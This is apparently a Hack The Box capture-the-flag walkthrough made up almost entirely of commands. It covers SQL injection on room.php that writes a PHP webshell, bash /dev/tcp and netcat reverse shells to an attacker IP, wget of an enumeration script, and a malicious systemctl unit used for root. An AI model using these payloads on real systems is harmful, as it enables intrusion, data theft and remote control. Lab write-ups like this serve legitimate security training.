```
SQL injection
Webshell
sudo -l
Reverse Shell - Bash
LinEnum
PrivEsc - systemctl
```

```
nmap -sS -sC -sV -T5 -Pn 10.10.10.143
```
![image](https://user-images.githubusercontent.com/33616880/231966154-8ab1d289-572e-4097-8072-e2a664de70ca.png)


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.143/FUZZ -fc 403 -e .aspx,.php,.txt,.html
```
![image](https://user-images.githubusercontent.com/33616880/231966267-6a6058e9-6223-44d8-acd9-72244a55407f.png)


```
http://10.10.10.143/room.php?cod=2
```
![image](https://user-images.githubusercontent.com/33616880/231967239-40ac1ae1-c35f-4c56-9740-62bd236b9436.png)


```
http://10.10.10.143/room.php?cod=2%20and%201=1
```
![image](https://github.com/regarmulia/HTB/assets/33616880/954aab73-ed1c-419c-8120-3785d666d6ad)






![image](https://user-images.githubusercontent.com/33616880/231967279-462d7629-3f4f-4f75-bff1-b82ba0cfeb7b.png)

![image](https://user-images.githubusercontent.com/33616880/231967320-8aa8e60a-e6b3-4552-882e-0ad264e09771.png)



![image](https://user-images.githubusercontent.com/33616880/231967993-6a81e947-d988-4e23-9042-a8ba3eb2bca0.png)



![image](https://user-images.githubusercontent.com/33616880/231968678-abdd6033-6a96-45b6-bc8e-0fd5e45791de.png)
![image](https://user-images.githubusercontent.com/33616880/231968797-0152fad4-d673-488d-aff8-4cbd8d10910d.png)
![image](https://user-images.githubusercontent.com/33616880/231968997-2d0da6ba-012b-480d-83b6-8c185543e797.png)


```
http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7 into outfile '/var/www/html/hacked.txt'
```
![image](https://user-images.githubusercontent.com/33616880/231969952-3829cca0-1e62-48ed-a680-8e597d111ff8.png)
![image](https://user-images.githubusercontent.com/33616880/231969969-fe7ccd80-1d5e-4185-9c24-377b58bbe4e1.png)


```
http://10.10.10.143/room.php?cod=-1 union select 1,'<?php system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'
curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=whoami'
```
![image](https://user-images.githubusercontent.com/33616880/231971738-3210b286-20ab-471c-8c63-556e238f3523.png)
![image](https://user-images.githubusercontent.com/33616880/231971768-31d1b5c7-93bb-4b3a-8b4e-d648a22900ce.png)


```
curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c "bash -i >& /dev/tcp/10.10.14.8/1234 0>&1"'
```
![image](https://user-images.githubusercontent.com/33616880/231972202-e13e19ba-e5cd-4ef9-8b24-ed13676f248b.png)
![image](https://user-images.githubusercontent.com/33616880/231972255-3fcdf22f-ef68-4a2a-87b3-c189d8936720.png)



```
sudo -l
```
![image](https://user-images.githubusercontent.com/33616880/231978294-ddc1284d-62b6-4669-ad17-5b0ec362a773.png)



```
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1"' > /tmp/shell.sh
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
```
![image](https://user-images.githubusercontent.com/33616880/231977903-441bb61c-6dad-427e-9d5f-387558289cf6.png)
![image](https://user-images.githubusercontent.com/33616880/231977956-2ac3c680-de93-4e87-8b3c-91a432c7efa6.png)



```
find / -perm -4000 2>/dev/null
```
![image](https://user-images.githubusercontent.com/33616880/231979320-9e90787c-3b50-40e9-b92d-cd4009af4304.png)



```
wget 10.10.14.8/LinEnum.sh
./LinEnum.sh
```
![image](https://user-images.githubusercontent.com/33616880/231979671-3ca30d26-3d40-412d-9cca-28b91cfaf839.png)
![image](https://user-images.githubusercontent.com/33616880/231979698-96af9d79-761b-4c32-a848-0c182173242e.png)


https://gtfobins.github.io/gtfobins/systemctl/
```
[Service]
Type=notify
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.8 443'
KillMode=process
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target
```
```
systemctl link /home/pepper/pwn.service
systemctl start pwn
```
![image](https://user-images.githubusercontent.com/33616880/231983233-c91e3200-561c-4995-8062-6cec3de97037.png)
![image](https://user-images.githubusercontent.com/33616880/231983256-1099084a-99c6-4477-a764-4c9530724f65.png)



